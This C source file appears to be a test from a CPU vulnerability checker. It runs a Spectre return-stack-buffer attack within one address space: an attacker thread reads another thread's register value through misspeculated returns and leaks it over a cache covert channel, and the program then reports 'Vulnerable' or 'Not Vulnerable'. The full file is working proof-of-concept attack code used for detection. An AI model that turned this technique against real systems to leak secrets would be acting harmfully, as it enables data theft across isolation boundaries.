#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>

#include "libcache/cache.h"
#include "lib/global.h"

// Sleep for an predetermined amount of time specified in register r14
void __attribute__((noinline)) in_place()
{
    size_t time = 0;
    asm volatile("movq %%r14, %0\n\t"
                 : "=r"(time));

    usleep(time);
    return;
}

void *__attribute__((noinline)) attacker()
{
    // Attacker is going to sleep for 65
    asm volatile("movq $65, %r14\t\n"); // 65 is 'A'

    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // Put to sleep
        // As victim will sometimes wake up before the attacker, it will return here
        in_place();
        size_t secret = 0;
        // Retrieve secret data from register r14
        asm volatile("movq %%r14, %0\n\t"
                     : "=r"(secret));

        // Encode data in covert channel
        cache_encode(secret);
    }
}

void *__attribute__((noinline)) victim()
{
    // Victim is going to sleep for 83
    asm volatile("movq $83, %r14\t\n"); // 83 is 'S'
    for (int i = 0; i < MAX_TRY_TIMES; i++)
    {
        // Call function and return here after misspeculation is detected
        in_place();
    }
}

int main(int argc, char **argv)
{
    PREPARE();

    // Create two interleaving threads
    pthread_t attacker_thread;
    pthread_t victim_thread;
    pthread_create(&attacker_thread, 0, attacker, 0);
    pthread_create(&victim_thread, 0, victim, 0);
    start_time = time(NULL);
    for (int j = 0; j < MAX_TRY_TIMES; j++)
    {
        // Flush our shared memory
        flush_shared_memory();

        mfence();
        nospec();

        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_RSB_sa_ip: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_RSB_sa_ip: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_RSB_sa_ip: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    pthread_join(attacker_thread, NULL);
    pthread_join(victim_thread, NULL);
    exit(exit_result);
}
